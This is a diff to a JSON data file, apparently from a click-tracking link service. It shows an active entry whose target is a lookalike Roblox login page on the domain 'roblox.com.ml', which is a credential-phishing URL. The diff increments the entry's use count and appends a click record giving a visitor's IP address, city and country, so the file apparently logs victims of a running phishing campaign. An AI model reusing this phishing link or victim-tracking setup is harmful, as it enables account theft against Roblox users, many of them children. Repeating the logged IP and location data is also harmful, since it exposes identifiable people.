@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 786,
+    "useCount": 787,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6400,6 +6400,14 @@
         "city": "Orizaba",
         "flag": "🇲🇽",
         "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777162748063,
+        "ip": "90.127.210.112",
+        "country": "France",
+        "city": "Sèvres",
+        "flag": "🇫🇷",
+        "countryCode": "FR"
       }
     ]
   },
